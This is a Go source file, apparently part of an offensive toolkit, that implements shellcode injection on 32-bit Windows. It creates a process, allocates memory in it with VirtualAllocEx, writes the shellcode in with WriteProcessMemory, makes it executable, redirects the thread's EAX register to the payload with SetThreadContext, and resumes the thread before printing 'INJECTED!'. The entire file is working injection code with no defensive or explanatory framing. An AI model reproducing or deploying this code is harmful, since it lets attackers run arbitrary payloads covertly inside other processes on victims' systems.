// +build windows,386

package inject

// #include <Windows.h>
import "C"

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

type CONTEXT struct {
	ContextFlags uint32
	Dr0 uint32
	Dr1 uint32
	Dr2 uint32
	Dr3 uint32
	Dr6 uint32
	Dr7 uint32
	FloatSave WOW64_FLOATING_SAVE_AREA
	SegGs uint32
	SegFs uint32
	SegEs uint32
	SegDs uint32
	Edi uint32
	Esi uint32
	Ebx uint32
	Edx uint32
	Ecx uint32
	Eax uint32
	Ebp uint32
	Eip uint32
	SegCs uint32
	EFlags uint32
	Esp uint32
	SegSs uint32
	ExtendedRegisters [512]byte
}
type WOW64_FLOATING_SAVE_AREA struct{
	ControlWord uint32
	StatusWord uint32
	TagWord uint32
	ErrorOffset uint32
	ErrorSelector uint32
	DataOffset uint32
	DataSelector uint32
	RegisterArea [80]byte
	Cr0NpxState uint32
}
func SetThreadContext(shellcode []byte){
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	getThreadContext := kernel32.NewProc("GetThreadContext")
	setThreadContext := kernel32.NewProc("SetThreadContext")
	resumeThread := kernel32.NewProc("ResumeThread")

	pi := CreateProcess()
	oldProtect := windows.PAGE_READWRITE

	lpBaseAddress, _, errVirtualAllocEx := virtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)),  windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAllocEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling virtualAllocEx:\r\n%s", errVirtualAllocEx.Error()))
	}

	_, _, errWriteProcessMemory := writeProcessMemory.Call(uintptr(pi.Process), lpBaseAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}

	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(pi.Process), lpBaseAddress, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}

	var context CONTEXT
	context.ContextFlags = 0x00000002

	_, _, errGetThreadContext := getThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&context)))
	if errGetThreadContext.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling GetThreadContext:\r\n%s", errGetThreadContext.Error()))
	}

	context.Eax = uint32(lpBaseAddress)

	_, _, errSetThreadContext := setThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&context)))
	if errSetThreadContext.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling SetThreadContext:\r\n%s", errSetThreadContext.Error()))
	}

	_, _, errResumeThread := resumeThread.Call(uintptr(pi.Thread))
	if errResumeThread.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
	}

	fmt.Println("INJECTED!")
}
